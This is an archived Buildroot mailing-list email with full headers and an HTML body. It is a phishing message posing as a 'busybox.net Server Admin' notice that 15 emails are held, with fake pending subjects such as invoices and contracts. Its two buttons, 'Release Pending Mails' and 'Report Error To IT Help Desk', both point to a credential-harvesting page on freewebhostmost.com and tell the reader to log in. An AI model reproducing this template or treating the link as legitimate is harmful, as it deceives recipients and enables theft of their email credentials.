Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id F2075C02190
	for <buildroot@archiver.kernel.org>; Fri, 31 Jan 2025 04:22:16 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 9475760614;
	Fri, 31 Jan 2025 04:22:16 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id gxZc9EVsIi6u; Fri, 31 Jan 2025 04:22:15 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 8F93060710
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp3.osuosl.org (Postfix) with ESMTP id 8F93060710;
	Fri, 31 Jan 2025 04:22:15 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id 3CA0312C
 for <buildroot@buildroot.org>; Fri, 31 Jan 2025 04:22:14 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 2D17281F2A
 for <buildroot@buildroot.org>; Fri, 31 Jan 2025 04:22:14 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 88kfMvM_zASB for <buildroot@buildroot.org>;
 Fri, 31 Jan 2025 04:22:13 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.246.67;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org E6D6381E9D
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org E6D6381E9D
Received: from busybox.net (unknown [192.227.246.67])
 by smtp1.osuosl.org (Postfix) with ESMTP id E6D6381E9D
 for <buildroot@busybox.net>; Fri, 31 Jan 2025 04:22:12 +0000 (UTC)
From: busybox.net Host Provider <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 31 Jan 2025 05:22:12 +0100
Message-ID: <20250131052211.F205D20155704A2F@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] buildroot@busybox.net (15) Important messages still
 pending to be delivered to your inbox
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7342036524358866736=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============7342036524358866736==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; orphans: 2; widows: 2; background-colo=
r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><tbody><tr><th style=3D"padding: 5px; border: 0px=
 solid rgb(0, 0, 0); border-image: none; width: 2px; color: rgb(0, 0, 0); b=
ackground-color: rgb(2, 151, 64);">&nbsp;</th><td style=3D"margin: 0px; pad=
ding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 665px=
; color: rgb(0, 0, 0); font-family: Roboto, Tahoma, Helvetica, sans-serif; =
background-color: rgb(243, 255, 248);">
<span style=3D"font-size: 12px;">From&nbsp;busybox.net Server Admin<br></sp=
an></td>
</tr></tbody></table>
<div style=3D"width: 700px; text-align: left; color: rgb(0, 0, 0); text-tra=
nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto=
, Tahoma, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-=
weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
 background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
kness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;"><br><br>You have&nbsp;[15] messages still =
pending to be delivered to your inbox and failed to deliver to your receipi=
ents<br><br><strong>Mailbox:&nbsp;</strong><a style=3D"color: rgb(17, 85, 2=
04);" href=3D"mailto:va@kant.ru" target=3D"_blank"><strong><u>buildroot@bus=
ybox.net</u></strong></a><br><br></div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: r=
gb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norma=
l; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text=
-decoration-style: initial; text-decoration-color:=20
initial;" dir=3D"ltr"><table style=3D"width: 700px; height: 208px; color: r=
gb(0, 0, 0); font-size: 15px; border-collapse: collapse;" border=3D"0" cell=
spacing=3D"2" cellpadding=3D"2"><tbody><tr><td style=3D"margin: 0px; width:=
 340px; font-family: Calibri; background-color: rgb(243, 255, 248);"><stron=
g style=3D"font-weight: bolder;">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;Subject</strong></td><td style=3D"margin: 0px; width: 230=
px; font-family: Calibri; background-color: rgb(243, 255, 248);"><strong st=
yle=3D"font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reci=
pient</strong></td><td style=3D"margin: 0px; width: 150px; font-family: Cal=
ibri; background-color: rgb(243, 255, 248);">
<strong style=3D"font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date</strong></td></tr><tr>=
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">
&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
FW: Invoice copy</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
 Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/31/2025 5:22:11 a.m..</td></tr><=
tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri; background=
-color: rgb(204, 204, 255);">
&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
Signed Contract</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
 Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/31/2025 5:22:11 a.m.=
=2E</td></tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calib=
ri; background-color: rgb(204, 204, 255);">
&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy">&nbsp;BL Copy, Comm=
ercial Invoice</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span><span>&nbsp;</sp=
an>&nbsp;buildroot@busybox.net</span></td><td style=3D"margin: 0px; width: =
150px; font-family: Calibri; background-color: rgb(204, 204, 255);">&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/3=
1/2025 5:22:11 a.m..</td></tr><tr><td style=3D"margin: 0px; width: 340px; f=
ont-family: Calibri; background-color: rgb(204, 204, 255);">
&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
Re: Request for quote</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
 Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/31/2025 5:22:11 a.m.=
=2E</td></tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calib=
ri; background-color: rgb(204, 204, 255);">
&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
Fwd: Payment ---- Forwarded message ----</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
 Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/31/2025 5:22:11 a.m..</td>=
</tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri; back=
ground-color: rgb(204, 204, 255);">
&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;First O=
rder</span></td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
busybox.net</span></td><td style=3D"margin: 0px; width: 160px; font-family:=
 Calibri; background-color: rgb(204, 204, 255);"><span>&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/31/2025 5:22:11 a.m.=
</span></td></tr></tbody></table><div style=3D"margin: 0px;">&nbsp;</div><o=
l style=3D"padding: 30px; margin-top: 0px;">
<li style=3D"margin-left: 15px;"><a title=3D"This external link opens in a =
new window" style=3D"background: rgb(80, 110, 216); padding: 10px; border-r=
adius: 2px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"http=
s://srverauth-processing.freewebhostmost.com/#buildroot@busybox.net" target=
=3D"_blank" rel=3D" noopener noreferrer">Release Pending Mails to inbox</a>=
<br><br><br></li><li style=3D"margin-left: 15px;">
<a title=3D"This external link opens in a new window" style=3D"background: =
rgb(212, 0, 0); padding: 10px; border-radius: 2px; color: rgb(255, 255, 255=
); text-decoration: none;" href=3D"https://srverauth-processing.freewebhost=
most.com/#buildroot@busybox.net" target=3D"_blank" rel=3D" noopener norefer=
rer">Report Error To IT Help Desk</a></li></ol><div style=3D"margin: 0px; f=
ont-family: arial, helvetica, sans-serif;"><br><br>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; font-=
variant-ligatures: normal; font-variant-caps: normal; text-decoration-style=
: initial; text-decoration-color: initial;" dir=3D"ltr"><span style=3D"colo=
r: rgb(0, 0, 0); font-family: Calibri; font-size: 14px;">
You will receive pending emails after successful login via portal as we apo=
logize for the inconvenience.</span></div></div></div><p>
</p>


</body></html>

--===============7342036524358866736==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============7342036524358866736==--
